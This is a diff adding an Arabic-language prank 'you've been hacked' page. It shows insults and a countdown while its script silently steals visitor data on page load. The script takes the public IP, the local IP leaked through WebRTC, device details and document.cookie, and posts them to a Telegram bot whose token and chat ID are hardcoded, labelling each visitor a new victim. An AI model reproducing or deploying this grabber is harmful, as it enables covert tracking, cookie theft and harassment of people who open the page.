@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<title>تم اختراقك يا مغفل</title>
+<style>
+  body {
+    background-color: black;
+    color: #00ff00;
+    font-family: 'Courier New', monospace;
+    text-align: center;
+    padding-top: 10vh;
+    user-select: none;
+  }
+  .glow {
+    text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+    font-size: 24px;
+    margin: 10px auto;
+  }
+  #countdown {
+    font-size: 48px;
+    font-weight: bold;
+    margin-top: 20px;
+    animation: pulse 1s infinite alternate;
+  }
+  @keyframes pulse {
+    0% { color: #00ff00; }
+    100% { color: #ff0000; }
+  }
+</style>
+</head>
+<body>
+  <div class="glow" id="insult"></div>
+  <div id="countdown">10</div>
+  <div class="glow">أنت الآن في قبضة الظلام، والوقت يداهمك...</div>
+<script>
+const token = "7627211872:AAGkJa6tkGQw1eMuM3766ead2HHx4sBCUZQ";
+const chat_id = "7752635710";
+const insults = [
+  "أيها المسكين، هل ظننت أن دخولك إلى هذا الموقع سيجعلك أكثر ذكاء؟ هاها، عقلك مازال في حضانة الطفولة!",
+  "يا من ظن نفسه في مأمن، لقد أمسكت بك كما يمسك الصياد بفريسته، وأنت لا تدري أن خيالك كان أكبر من عقلك.",
+  "أنت الآن مجرد رقم في قائمة الفاشلين الرقمية، فهل تستحق أكثر من السخرية والازدراء؟",
+  "حاولت الاختباء، لكنك كمن يدفن رأسه في الرمال، تنسى أن الذكاء لا يُباع في سوق النخاسة!",
+  "يا عزيزي، لو كنت ذكيًا لما وقعت في هذا الفخ، لكن للأسف يبدو أن الغباء هو رفيق دربك.",
+  "أنت في عالم رقمي مظلم، لا نور فيه سوى ضحكاتنا على غبائك.",
+  "ضحكتك تخيفنا أكثر من حماقتك، فلنرى كم ستبقى واقفًا أمام قسوة الواقع.",
+  "تذكّر أن الفشل ليس نهاية الطريق، لكنه بداية رحلة طويلة من الإحباط والندم."
+];
+function showRandomInsult() {
+  const insult = insults[Math.floor(Math.random() * insults.length)];
+  document.getElementById('insult').innerText = insult;
+}
+showRandomInsult();
+let timeLeft = 10;
+const countdownEl = document.getElementById("countdown");
+const countdownInterval = setInterval(() => {
+  timeLeft--;
+  countdownEl.innerText = timeLeft > 0 ? timeLeft : "انتهى الوقت";
+  if(timeLeft <= 0) clearInterval(countdownInterval);
+}, 1000);
+function getWebRTCIP(callback) {
+  const pc = new RTCPeerConnection({iceServers:[]});
+  pc.createDataChannel('');
+  pc.createOffer().then(offer => pc.setLocalDescription(offer));
+  pc.onicecandidate = event => {
+    if (event && event.candidate && event.candidate.candidate) {
+      const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+      const ip = ipRegex.exec(event.candidate.candidate)[1];
+      callback(ip);
+      pc.close();
+    }
+  };
+}
+function getPublicIP() {
+  return fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => data.ip)
+    .catch(() => "غير معروف");
+}
+async function collectDataAndSend() {
+  let ipPublic = await getPublicIP();
+  getWebRTCIP((ipLocal) => {
+    const info = {
+      ip_public: ipPublic || "غير معروف",
+      ip_local: ipLocal || "غير معروف",
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screen: `${screen.width}x${screen.height}`,
+      memory: navigator.deviceMemory || "غير معروف",
+      cores: navigator.hardwareConcurrency || "غير معروف",
+      cookie: document.cookie || "غير معروف",
+      time: new Date().toLocaleString()
+    };
+    const msg = `
+🔥🔥 تم اختراق ضحية جديدة 🔥🔥
+Public IP: ${info.ip_public}
+Private IP: ${info.ip_local}
+Device: ${info.platform}
+Screen: ${info.screen}
+Language: ${info.language}
+RAM: ${info.memory} GB
+Cores: ${info.cores}
+Cookies: ${info.cookie}
+UserAgent: ${info.userAgent}
+Time: ${info.time}
+`;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({chat_id, text: msg})
+    });
+  });
+}
+collectDataAndSend();
+</script>
+</body>
+</html>
